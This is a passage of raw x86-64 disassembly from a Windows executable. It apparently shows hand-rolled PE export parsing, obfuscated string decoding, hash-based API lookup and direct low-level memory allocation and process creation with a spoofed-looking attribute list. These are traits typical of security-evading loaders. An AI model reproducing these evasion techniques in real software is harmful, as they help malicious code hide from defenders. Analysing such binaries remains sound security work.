   140002560:	48 83 c2 28          	add    $0x28,%rdx
   140002564:	41 39 d0             	cmp    %edx,%r8d
   140002567:	74 1e                	je     0x140002587
   140002569:	44 8b 4c 10 0c       	mov    0xc(%rax,%rdx,1),%r9d
   14000256e:	4c 39 c9             	cmp    %r9,%rcx
   140002571:	72 ed                	jb     0x140002560
   140002573:	44 03 4c 10 08       	add    0x8(%rax,%rdx,1),%r9d
   140002578:	4c 39 c9             	cmp    %r9,%rcx
   14000257b:	73 e3                	jae    0x140002560
   14000257d:	8b 44 10 24          	mov    0x24(%rax,%rdx,1),%eax
   140002581:	f7 d0                	not    %eax
   140002583:	c1 e8 1f             	shr    $0x1f,%eax
   140002586:	c3                   	ret
   140002587:	31 c0                	xor    %eax,%eax
   140002589:	c3                   	ret
   14000258a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002590:	56                   	push   %rsi
   140002591:	48 8b 15 70 7a 00 00 	mov    0x7a70(%rip),%rdx        # 0x14000a008
   140002598:	0f b7 02             	movzwl (%rdx),%eax
   14000259b:	3d 4d 5a 00 00       	cmp    $0x5a4d,%eax
   1400025a0:	0f 85 87 00 00 00    	jne    0x14000262d
   1400025a6:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   1400025aa:	81 3c 02 50 45 00 00 	cmpl   $0x4550,(%rdx,%rax,1)
   1400025b1:	75 7a                	jne    0x14000262d
   1400025b3:	48 01 d0             	add    %rdx,%rax
   1400025b6:	44 0f b7 40 18       	movzwl 0x18(%rax),%r8d
   1400025bb:	41 81 f8 0b 02 00 00 	cmp    $0x20b,%r8d
   1400025c2:	75 69                	jne    0x14000262d
   1400025c4:	44 8b 80 90 00 00 00 	mov    0x90(%rax),%r8d
   1400025cb:	4d 85 c0             	test   %r8,%r8
   1400025ce:	74 5d                	je     0x14000262d
   1400025d0:	44 0f b7 48 06       	movzwl 0x6(%rax),%r9d
   1400025d5:	4d 85 c9             	test   %r9,%r9
   1400025d8:	74 53                	je     0x14000262d
   1400025da:	44 0f b7 50 14       	movzwl 0x14(%rax),%r10d
   1400025df:	49 c1 e1 03          	shl    $0x3,%r9
   1400025e3:	4f 8d 0c 89          	lea    (%r9,%r9,4),%r9
   1400025e7:	49 01 c2             	add    %rax,%r10
   1400025ea:	49 83 c2 24          	add    $0x24,%r10
   1400025ee:	31 c0                	xor    %eax,%eax
   1400025f0:	45 31 db             	xor    %r11d,%r11d
   1400025f3:	eb 14                	jmp    0x140002609
   1400025f5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400025fc:	00 00 00 00 
   140002600:	49 83 c3 28          	add    $0x28,%r11
   140002604:	45 39 d9             	cmp    %r11d,%r9d
   140002607:	74 26                	je     0x14000262f
   140002609:	43 8b 34 1a          	mov    (%r10,%r11,1),%esi
   14000260d:	44 39 c6             	cmp    %r8d,%esi
   140002610:	77 ee                	ja     0x140002600
   140002612:	43 03 74 1a fc       	add    -0x4(%r10,%r11,1),%esi
   140002617:	44 39 c6             	cmp    %r8d,%esi
   14000261a:	76 e4                	jbe    0x140002600
   14000261c:	4c 01 c2             	add    %r8,%rdx
   14000261f:	48 83 c2 0c          	add    $0xc,%rdx
   140002623:	31 c0                	xor    %eax,%eax
   140002625:	83 7a f8 00          	cmpl   $0x0,-0x8(%rdx)
   140002629:	75 26                	jne    0x140002651
   14000262b:	eb 1f                	jmp    0x14000264c
   14000262d:	31 c0                	xor    %eax,%eax
   14000262f:	5e                   	pop    %rsi
   140002630:	c3                   	ret
   140002631:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140002638:	0f 1f 84 00 00 00 00 
   14000263f:	00 
   140002640:	ff c9                	dec    %ecx
   140002642:	48 83 c2 14          	add    $0x14,%rdx
   140002646:	83 7a f8 00          	cmpl   $0x0,-0x8(%rdx)
   14000264a:	75 05                	jne    0x140002651
   14000264c:	83 3a 00             	cmpl   $0x0,(%rdx)
   14000264f:	74 de                	je     0x14000262f
   140002651:	85 c9                	test   %ecx,%ecx
   140002653:	7f eb                	jg     0x140002640
   140002655:	8b 02                	mov    (%rdx),%eax
   140002657:	48 03 05 aa 79 00 00 	add    0x79aa(%rip),%rax        # 0x14000a008
   14000265e:	eb cf                	jmp    0x14000262f
   140002660:	51                   	push   %rcx
   140002661:	50                   	push   %rax
   140002662:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002668:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   14000266d:	72 18                	jb     0x140002687
   14000266f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140002676:	48 85 09             	test   %rcx,(%rcx)
   140002679:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   14000267f:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002685:	77 e8                	ja     0x14000266f
   140002687:	48 29 c1             	sub    %rax,%rcx
   14000268a:	48 85 09             	test   %rcx,(%rcx)
   14000268d:	58                   	pop    %rax
   14000268e:	59                   	pop    %rcx
   14000268f:	c3                   	ret
   140002690:	41 57                	push   %r15
   140002692:	41 56                	push   %r14
   140002694:	41 55                	push   %r13
   140002696:	41 54                	push   %r12
   140002698:	56                   	push   %rsi
   140002699:	57                   	push   %rdi
   14000269a:	55                   	push   %rbp
   14000269b:	53                   	push   %rbx
   14000269c:	48 81 ec 58 03 00 00 	sub    $0x358,%rsp
   1400026a3:	0f 29 b4 24 40 03 00 	movaps %xmm6,0x340(%rsp)
   1400026aa:	00 
   1400026ab:	4d 89 ce             	mov    %r9,%r14
   1400026ae:	4c 89 c3             	mov    %r8,%rbx
   1400026b1:	49 89 d7             	mov    %rdx,%r15
   1400026b4:	48 89 8c 24 c0 00 00 	mov    %rcx,0xc0(%rsp)
   1400026bb:	00 
   1400026bc:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   1400026c3:	00 00 
   1400026c5:	48 c7 44 24 68 00 00 	movq   $0x0,0x68(%rsp)
   1400026cc:	00 00 
   1400026ce:	48 c7 84 24 d0 00 00 	movq   $0x0,0xd0(%rsp)
   1400026d5:	00 00 00 00 00 
   1400026da:	48 c7 84 24 98 00 00 	movq   $0x0,0x98(%rsp)
   1400026e1:	00 00 00 00 00 
   1400026e6:	4c 8d 8c 24 98 00 00 	lea    0x98(%rsp),%r9
   1400026ed:	00 
   1400026ee:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400026f3:	31 d2                	xor    %edx,%edx
   1400026f5:	45 31 c0             	xor    %r8d,%r8d
   1400026f8:	e8 60 ee ff ff       	call   0x14000155d
   1400026fd:	85 c0                	test   %eax,%eax
   1400026ff:	0f 88 ef 00 00 00    	js     0x1400027f4
   140002705:	48 8b 3c 25 40 00 00 	mov    0x40,%rdi
   14000270c:	00 
   14000270d:	80 3d 82 b7 28 00 00 	cmpb   $0x0,0x28b782(%rip)        # 0x14028de96
   140002714:	0f 84 0d 06 00 00    	je     0x140002d27
   14000271a:	48 8d b4 24 38 01 00 	lea    0x138(%rsp),%rsi
   140002721:	00 
   140002722:	80 3d c1 b8 28 00 00 	cmpb   $0x0,0x28b8c1(%rip)        # 0x14028dfea
   140002729:	74 5a                	je     0x140002785
   14000272b:	66 0f 6f 05 9d b8 28 	movdqa 0x28b89d(%rip),%xmm0        # 0x14028dfd0
   140002732:	00 
   140002733:	66 0f fd 05 25 7e 00 	paddw  0x7e25(%rip),%xmm0        # 0x14000a560
   14000273a:	00 
   14000273b:	66 0f db 05 2d 7e 00 	pand   0x7e2d(%rip),%xmm0        # 0x14000a570
   140002742:	00 
   140002743:	66 0f 7f 05 85 b8 28 	movdqa %xmm0,0x28b885(%rip)        # 0x14028dfd0
   14000274a:	00 
   14000274b:	f3 0f 7e 05 8d b8 28 	movq   0x28b88d(%rip),%xmm0        # 0x14028dfe0
   140002752:	00 
   140002753:	66 0f fd 05 25 7e 00 	paddw  0x7e25(%rip),%xmm0        # 0x14000a580
   14000275a:	00 
   14000275b:	66 0f db 05 2d 7e 00 	pand   0x7e2d(%rip),%xmm0        # 0x14000a590
   140002762:	00 
   140002763:	66 0f d6 05 75 b8 28 	movq   %xmm0,0x28b875(%rip)        # 0x14028dfe0
   14000276a:	00 
   14000276b:	8b 05 77 b8 28 00    	mov    0x28b877(%rip),%eax        # 0x14028dfe8
   140002771:	83 c0 2d             	add    $0x2d,%eax
   140002774:	0f b6 c0             	movzbl %al,%eax
   140002777:	66 89 05 6a b8 28 00 	mov    %ax,0x28b86a(%rip)        # 0x14028dfe8
   14000277e:	c6 05 65 b8 28 00 00 	movb   $0x0,0x28b865(%rip)        # 0x14028dfea
   140002785:	48 8d 15 44 b8 28 00 	lea    0x28b844(%rip),%rdx        # 0x14028dfd0
   14000278c:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140002792:	48 89 f9             	mov    %rdi,%rcx
   140002795:	e8 66 75 00 00       	call   0x140009d00
   14000279a:	c7 84 24 30 01 00 00 	movl   $0x30,0x130(%rsp)
   1400027a1:	30 00 00 00 
   1400027a5:	66 0f ef c0          	pxor   %xmm0,%xmm0
   1400027a9:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   1400027ad:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%rsi)
   1400027b4:	f3 0f 7f 46 18       	movdqu %xmm0,0x18(%rsi)
   1400027b9:	48 8b 04 25 50 00 00 	mov    0x50,%rax
   1400027c0:	00 
   1400027c1:	48 89 84 24 d8 00 00 	mov    %rax,0xd8(%rsp)
   1400027c8:	00 
   1400027c9:	48 c7 84 24 e0 00 00 	movq   $0x0,0xe0(%rsp)
   1400027d0:	00 00 00 00 00 
   1400027d5:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400027da:	4c 8d 84 24 30 01 00 	lea    0x130(%rsp),%r8
   1400027e1:	00 
   1400027e2:	4c 8d 8c 24 d8 00 00 	lea    0xd8(%rsp),%r9
   1400027e9:	00 
   1400027ea:	ba 80 00 00 00       	mov    $0x80,%edx
   1400027ef:	e8 f1 ec ff ff       	call   0x1400014e5
   1400027f4:	48 8d 94 24 d0 00 00 	lea    0xd0(%rsp),%rdx
   1400027fb:	00 
   1400027fc:	4c 8d 84 24 98 00 00 	lea    0x98(%rsp),%r8
   140002803:	00 
   140002804:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   14000280b:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002811:	e8 b1 ec ff ff       	call   0x1400014c7
   140002816:	48 83 7c 24 58 00    	cmpq   $0x0,0x58(%rsp)
   14000281c:	75 09                	jne    0x140002827
   14000281e:	48 c7 44 24 58 ff ff 	movq   $0xffffffffffffffff,0x58(%rsp)
   140002825:	ff ff 
   140002827:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   14000282c:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002833:	ba 03 00 00 00       	mov    $0x3,%edx
   140002838:	e8 c6 ec ff ff       	call   0x140001503
   14000283d:	b9 a6 d2 7f 85       	mov    $0x857fd2a6,%ecx
   140002842:	e8 69 6f 00 00       	call   0x1400097b0
   140002847:	89 c0                	mov    %eax,%eax
   140002849:	65 48 8b 00          	mov    %gs:(%rax),%rax
   14000284d:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140002854:	00 
   140002855:	48 8d 8c 24 30 01 00 	lea    0x130(%rsp),%rcx
   14000285c:	00 
   14000285d:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140002863:	31 d2                	xor    %edx,%edx
   140002865:	e8 66 75 00 00       	call   0x140009dd0
   14000286a:	80 3d 26 b6 28 00 00 	cmpb   $0x0,0x28b626(%rip)        # 0x14028de97
   140002871:	0f 84 6a 04 00 00    	je     0x140002ce1
   140002877:	80 3d 7c b7 28 00 00 	cmpb   $0x0,0x28b77c(%rip)        # 0x14028dffa
   14000287e:	74 3c                	je     0x1400028bc
   140002880:	f3 0f 7e 05 68 b7 28 	movq   0x28b768(%rip),%xmm0        # 0x14028dff0
   140002887:	00 
   140002888:	66 0f fd 05 10 7d 00 	paddw  0x7d10(%rip),%xmm0        # 0x14000a5a0
   14000288f:	00 
   140002890:	66 0f db 05 f8 7c 00 	pand   0x7cf8(%rip),%xmm0        # 0x14000a590
   140002897:	00 
   140002898:	66 0f d6 05 50 b7 28 	movq   %xmm0,0x28b750(%rip)        # 0x14028dff0
   14000289f:	00 
   1400028a0:	b8 bf 00 00 00       	mov    $0xbf,%eax
   1400028a5:	03 05 4d b7 28 00    	add    0x28b74d(%rip),%eax        # 0x14028dff8
   1400028ab:	0f b6 c0             	movzbl %al,%eax
   1400028ae:	66 89 05 43 b7 28 00 	mov    %ax,0x28b743(%rip)        # 0x14028dff8
   1400028b5:	c6 05 3e b7 28 00 00 	movb   $0x0,0x28b73e(%rip)        # 0x14028dffa
   1400028bc:	48 8d 15 2d b7 28 00 	lea    0x28b72d(%rip),%rdx        # 0x14028dff0
   1400028c3:	48 8d b4 24 30 01 00 	lea    0x130(%rsp),%rsi
   1400028ca:	00 
   1400028cb:	48 89 f1             	mov    %rsi,%rcx
   1400028ce:	e8 0d 74 00 00       	call   0x140009ce0
   1400028d3:	48 89 f1             	mov    %rsi,%rcx
   1400028d6:	4c 89 fa             	mov    %r15,%rdx
   1400028d9:	e8 f2 73 00 00       	call   0x140009cd0
   1400028de:	48 89 f1             	mov    %rsi,%rcx
   1400028e1:	e8 0a 74 00 00       	call   0x140009cf0
   1400028e6:	49 89 c7             	mov    %rax,%r15
   1400028e9:	4d 85 f6             	test   %r14,%r14
   1400028ec:	74 2c                	je     0x14000291a
   1400028ee:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   1400028f3:	4c 89 f1             	mov    %r14,%rcx
   1400028f6:	e8 f5 73 00 00       	call   0x140009cf0
   1400028fb:	48 8d 0c 45 02 00 00 	lea    0x2(,%rax,2),%rcx
   140002902:	00 
   140002903:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   140002908:	48 b9 00 00 0b 08 e0 	movabs $0x6ede64e0080b0000,%rcx
   14000290f:	64 de 6e 
   140002912:	4c 8d 24 41          	lea    (%rcx,%rax,2),%r12
   140002916:	31 ff                	xor    %edi,%edi
   140002918:	eb 35                	jmp    0x14000294f
   14000291a:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   140002921:	00 
   140002922:	48 8b 40 20          	mov    0x20(%rax),%rax
   140002926:	48 8b 48 38          	mov    0x38(%rax),%rcx
   14000292a:	48 8b 40 40          	mov    0x40(%rax),%rax
   14000292e:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140002933:	48 89 c8             	mov    %rcx,%rax
   140002936:	48 c1 e8 10          	shr    $0x10,%rax
   14000293a:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   14000293f:	48 bf 00 00 00 00 ff 	movabs $0xffffffff00000000,%rdi
   140002946:	ff ff ff 
   140002949:	49 89 cc             	mov    %rcx,%r12
   14000294c:	48 21 cf             	and    %rcx,%rdi
   14000294f:	48 8b 8c 24 c0 03 00 	mov    0x3c0(%rsp),%rcx
   140002956:	00 
   140002957:	4e 8d 34 7d 02 00 00 	lea    0x2(,%r15,2),%r14
   14000295e:	00 
   14000295f:	4d 01 ff             	add    %r15,%r15
   140002962:	48 85 db             	test   %rbx,%rbx
   140002965:	74 1e                	je     0x140002985
   140002967:	48 89 ce             	mov    %rcx,%rsi
   14000296a:	48 89 d9             	mov    %rbx,%rcx
   14000296d:	e8 7e 73 00 00       	call   0x140009cf0
   140002972:	48 89 f1             	mov    %rsi,%rcx
   140002975:	49 89 c5             	mov    %rax,%r13
   140002978:	48 8d 2c 45 02 00 00 	lea    0x2(,%rax,2),%rbp
   14000297f:	00 
   140002980:	49 01 c5             	add    %rax,%r13
   140002983:	eb 0f                	jmp    0x140002994
   140002985:	44 89 f5             	mov    %r14d,%ebp
   140002988:	81 e5 fe ff 00 00    	and    $0xfffe,%ebp
   14000298e:	48 89 f3             	mov    %rsi,%rbx
   140002991:	4d 89 fd             	mov    %r15,%r13
   140002994:	48 89 9c 24 b8 00 00 	mov    %rbx,0xb8(%rsp)
   14000299b:	00 
   14000299c:	48 85 c9             	test   %rcx,%rcx
   14000299f:	75 38                	jne    0x1400029d9
   1400029a1:	80 3d f0 b4 28 00 00 	cmpb   $0x0,0x28b4f0(%rip)        # 0x14028de98
   1400029a8:	0f 84 c2 03 00 00    	je     0x140002d70
   1400029ae:	48 8d 0d 47 b6 28 00 	lea    0x28b647(%rip),%rcx        # 0x14028dffc
   1400029b5:	80 3d 42 b6 28 00 00 	cmpb   $0x0,0x28b642(%rip)        # 0x14028dffe
   1400029bc:	74 1b                	je     0x1400029d9
   1400029be:	0f b7 05 37 b6 28 00 	movzwl 0x28b637(%rip),%eax        # 0x14028dffc
   1400029c5:	83 c0 39             	add    $0x39,%eax
   1400029c8:	0f b6 c0             	movzbl %al,%eax
   1400029cb:	66 89 05 2a b6 28 00 	mov    %ax,0x28b62a(%rip)        # 0x14028dffc
   1400029d2:	c6 05 25 b6 28 00 00 	movb   $0x0,0x28b625(%rip)        # 0x14028dffe
   1400029d9:	41 81 e5 fe ff 00 00 	and    $0xfffe,%r13d
   1400029e0:	48 89 8c 24 b0 00 00 	mov    %rcx,0xb0(%rsp)
   1400029e7:	00 
   1400029e8:	e8 03 73 00 00       	call   0x140009cf0
   1400029ed:	48 89 c3             	mov    %rax,%rbx
   1400029f0:	01 c0                	add    %eax,%eax
   1400029f2:	41 0f b7 f4          	movzwl %r12w,%esi
   1400029f6:	41 81 e7 fe ff 00 00 	and    $0xfffe,%r15d
   1400029fd:	4c 89 bc 24 a0 00 00 	mov    %r15,0xa0(%rsp)
   140002a04:	00 
   140002a05:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   140002a0c:	00 
   140002a0d:	49 8b 4c 24 20       	mov    0x20(%r12),%rcx
   140002a12:	0f b7 49 50          	movzwl 0x50(%rcx),%ecx
   140002a16:	0f b7 d0             	movzwl %ax,%edx
   140002a19:	48 89 94 24 a8 00 00 	mov    %rdx,0xa8(%rsp)
   140002a20:	00 
   140002a21:	4a 8d 04 2e          	lea    (%rsi,%r13,1),%rax
   140002a25:	4c 01 f8             	add    %r15,%rax
   140002a28:	48 01 d1             	add    %rdx,%rcx
   140002a2b:	4c 8d 3c 08          	lea    (%rax,%rcx,1),%r15
   140002a2f:	49 81 c7 16 04 00 00 	add    $0x416,%r15
   140002a36:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   140002a3d:	00 00 
   140002a3f:	4c 89 bc 24 90 00 00 	mov    %r15,0x90(%rsp)
   140002a46:	00 
   140002a47:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002a4e:	00 
   140002a4f:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140002a56:	00 
   140002a57:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140002a5c:	4c 8d 8c 24 90 00 00 	lea    0x90(%rsp),%r9
   140002a63:	00 
   140002a64:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002a6b:	45 31 c0             	xor    %r8d,%r8d
   140002a6e:	e8 36 ea ff ff       	call   0x1400014a9
   140002a73:	4c 89 e1             	mov    %r12,%rcx
   140002a76:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140002a7b:	45 89 3c 24          	mov    %r15d,(%r12)
   140002a7f:	45 89 7c 24 04       	mov    %r15d,0x4(%r12)
   140002a84:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140002a89:	c1 e0 10             	shl    $0x10,%eax
   140002a8c:	48 09 c7             	or     %rax,%rdi
   140002a8f:	48 09 f7             	or     %rsi,%rdi
   140002a92:	41 c7 44 24 08 01 00 	movl   $0x1,0x8(%r12)
   140002a99:	00 00 
   140002a9b:	49 c7 44 24 10 fd ff 	movq   $0xfffffffffffffffd,0x10(%r12)
   140002aa2:	ff ff 
   140002aa4:	49 89 7c 24 38       	mov    %rdi,0x38(%r12)
   140002aa9:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140002aae:	49 89 44 24 40       	mov    %rax,0x40(%r12)
   140002ab3:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002ab7:	0f 10 40 50          	movups 0x50(%rax),%xmm0
   140002abb:	41 0f 11 44 24 50    	movups %xmm0,0x50(%r12)
   140002ac1:	41 83 e6 fe          	and    $0xfffffffe,%r14d
   140002ac5:	41 c1 e6 10          	shl    $0x10,%r14d
   140002ac9:	4c 8b bc 24 a0 00 00 	mov    0xa0(%rsp),%r15
   140002ad0:	00 
   140002ad1:	4d 09 fe             	or     %r15,%r14
   140002ad4:	4d 89 74 24 60       	mov    %r14,0x60(%r12)
   140002ad9:	c1 e5 10             	shl    $0x10,%ebp
   140002adc:	4c 09 ed             	or     %r13,%rbp
   140002adf:	48 8d bc 24 30 01 00 	lea    0x130(%rsp),%rdi
   140002ae6:	00 
   140002ae7:	49 89 7c 24 68       	mov    %rdi,0x68(%r12)
   140002aec:	49 89 6c 24 70       	mov    %rbp,0x70(%r12)
   140002af1:	48 8b 84 24 b8 00 00 	mov    0xb8(%rsp),%rax
   140002af8:	00 
   140002af9:	49 89 44 24 78       	mov    %rax,0x78(%r12)
   140002afe:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002b02:	48 8b 80 80 00 00 00 	mov    0x80(%rax),%rax
   140002b09:	49 89 84 24 80 00 00 	mov    %rax,0x80(%r12)
   140002b10:	00 
   140002b11:	c1 e3 11             	shl    $0x11,%ebx
   140002b14:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
   140002b1b:	00 
   140002b1c:	01 d8                	add    %ebx,%eax
   140002b1e:	05 00 00 02 00       	add    $0x20000,%eax
   140002b23:	49 89 84 24 d0 00 00 	mov    %rax,0xd0(%r12)
   140002b2a:	00 
   140002b2b:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   140002b32:	00 
   140002b33:	49 89 84 24 d8 00 00 	mov    %rax,0xd8(%r12)
   140002b3a:	00 
   140002b3b:	48 8b 41 20          	mov    0x20(%rcx),%rax
   140002b3f:	48 8b 80 f0 03 00 00 	mov    0x3f0(%rax),%rax
   140002b46:	49 89 84 24 f0 03 00 	mov    %rax,0x3f0(%r12)
   140002b4d:	00 
   140002b4e:	0f 57 f6             	xorps  %xmm6,%xmm6
   140002b51:	0f 11 b4 24 20 01 00 	movups %xmm6,0x120(%rsp)
   140002b58:	00 
   140002b59:	0f 11 b4 24 10 01 00 	movups %xmm6,0x110(%rsp)
   140002b60:	00 
   140002b61:	0f 11 b4 24 00 01 00 	movups %xmm6,0x100(%rsp)
   140002b68:	00 
   140002b69:	0f 11 b4 24 f0 00 00 	movups %xmm6,0xf0(%rsp)
   140002b70:	00 
   140002b71:	0f 11 b4 24 e0 00 00 	movups %xmm6,0xe0(%rsp)
   140002b78:	00 
   140002b79:	48 c7 84 24 d8 00 00 	movq   $0x58,0xd8(%rsp)
   140002b80:	00 58 00 00 00 
   140002b85:	48 c7 84 24 88 00 00 	movq   $0x0,0x88(%rsp)
   140002b8c:	00 00 00 00 00 
   140002b91:	48 c7 84 24 c8 00 00 	movq   $0x60,0xc8(%rsp)
   140002b98:	00 60 00 00 00 
   140002b9d:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002ba4:	00 
   140002ba5:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140002bac:	00 
   140002bad:	48 8d 9c 24 88 00 00 	lea    0x88(%rsp),%rbx
   140002bb4:	00 
   140002bb5:	48 8d b4 24 c8 00 00 	lea    0xc8(%rsp),%rsi
   140002bbc:	00 
   140002bbd:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002bc4:	48 89 da             	mov    %rbx,%rdx
   140002bc7:	45 31 c0             	xor    %r8d,%r8d
   140002bca:	49 89 f1             	mov    %rsi,%r9
   140002bcd:	e8 d7 e8 ff ff       	call   0x1400014a9
   140002bd2:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   140002bd9:	00 
   140002bda:	48 c7 00 68 00 00 00 	movq   $0x68,(%rax)
   140002be1:	48 c7 40 08 05 00 02 	movq   $0x20005,0x8(%rax)
   140002be8:	00 
   140002be9:	4c 89 78 10          	mov    %r15,0x10(%rax)
   140002bed:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140002bf1:	48 c7 40 28 00 00 06 	movq   $0x60000,0x28(%rax)
   140002bf8:	00 
   140002bf9:	48 c7 40 30 08 00 00 	movq   $0x8,0x30(%rax)
   140002c00:	00 
   140002c01:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140002c06:	48 89 48 38          	mov    %rcx,0x38(%rax)
   140002c0a:	48 c7 40 48 02 00 06 	movq   $0x60002,0x48(%rax)
   140002c11:	00 
   140002c12:	48 c7 40 50 08 00 00 	movq   $0x8,0x50(%rax)
   140002c19:	00 
   140002c1a:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002c1f:	48 89 48 58          	mov    %rcx,0x58(%rax)
   140002c23:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
   140002c2a:	00 
   140002c2b:	0f 11 31             	movups %xmm6,(%rcx)
   140002c2e:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140002c35:	00 
   140002c36:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   140002c3a:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002c3f:	48 8d 84 24 d8 00 00 	lea    0xd8(%rsp),%rax
   140002c46:	00 
   140002c47:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002c4c:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   140002c51:	8b 84 24 c8 03 00 00 	mov    0x3c8(%rsp),%eax
   140002c58:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140002c5c:	0f 11 74 24 20       	movups %xmm6,0x20(%rsp)
   140002c61:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140002c68:	00 
   140002c69:	41 b8 ff ff 1f 00    	mov    $0x1fffff,%r8d
   140002c6f:	41 b9 ff ff 1f 00    	mov    $0x1fffff,%r9d
   140002c75:	e8 7a e8 ff ff       	call   0x1400014f4
   140002c7a:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002c81:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140002c86:	4c 8d 84 24 90 00 00 	lea    0x90(%rsp),%r8
   140002c8d:	00 
   140002c8e:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002c94:	e8 2e e8 ff ff       	call   0x1400014c7
   140002c99:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002ca0:	48 89 da             	mov    %rbx,%rdx
   140002ca3:	49 89 f0             	mov    %rsi,%r8
   140002ca6:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140002cac:	e8 16 e8 ff ff       	call   0x1400014c7
   140002cb1:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140002cb6:	e8 a3 e7 ff ff       	call   0x14000145e
   140002cbb:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140002cc0:	e8 99 e7 ff ff       	call   0x14000145e
   140002cc5:	0f 28 b4 24 40 03 00 	movaps 0x340(%rsp),%xmm6
   140002ccc:	00 
   140002ccd:	48 81 c4 58 03 00 00 	add    $0x358,%rsp
   140002cd4:	5b                   	pop    %rbx
   140002cd5:	5d                   	pop    %rbp
   140002cd6:	5f                   	pop    %rdi
   140002cd7:	5e                   	pop    %rsi
   140002cd8:	41 5c                	pop    %r12
   140002cda:	41 5d                	pop    %r13
   140002cdc:	41 5e                	pop    %r14
   140002cde:	41 5f                	pop    %r15
   140002ce0:	c3                   	ret
   140002ce1:	c6 05 12 b3 28 00 01 	movb   $0x1,0x28b312(%rip)        # 0x14028dffa
   140002ce8:	48 b8 9d 00 80 00 80 	movabs $0x9d00800080009d,%rax
   140002cef:	00 9d 00 
   140002cf2:	48 89 05 f7 b2 28 00 	mov    %rax,0x28b2f7(%rip)        # 0x14028dff0
   140002cf9:	66 c7 05 f6 b2 28 00 	movw   $0x41,0x28b2f6(%rip)        # 0x14028dff8
   140002d00:	41 00 
   140002d02:	48 8d 0d b7 00 00 00 	lea    0xb7(%rip),%rcx        # 0x140002dc0
   140002d09:	e8 62 e6 ff ff       	call   0x140001370
   140002d0e:	c6 05 82 b1 28 00 01 	movb   $0x1,0x28b182(%rip)        # 0x14028de97
   140002d15:	80 3d de b2 28 00 00 	cmpb   $0x0,0x28b2de(%rip)        # 0x14028dffa
   140002d1c:	0f 85 5e fb ff ff    	jne    0x140002880
   140002d22:	e9 95 fb ff ff       	jmp    0x1400028bc
   140002d27:	c6 05 bc b2 28 00 01 	movb   $0x1,0x28b2bc(%rip)        # 0x14028dfea
   140002d2e:	66 0f 6f 05 1a 78 00 	movdqa 0x781a(%rip),%xmm0        # 0x14000a550
   140002d35:	00 
   140002d36:	66 0f 7f 05 92 b2 28 	movdqa %xmm0,0x28b292(%rip)        # 0x14028dfd0
   140002d3d:	00 
   140002d3e:	48 b8 01 00 38 00 4b 	movabs $0x38004b00380001,%rax
   140002d45:	00 38 00 
   140002d48:	48 89 05 91 b2 28 00 	mov    %rax,0x28b291(%rip)        # 0x14028dfe0
   140002d4f:	66 c7 05 90 b2 28 00 	movw   $0xd3,0x28b290(%rip)        # 0x14028dfe8
   140002d56:	d3 00 
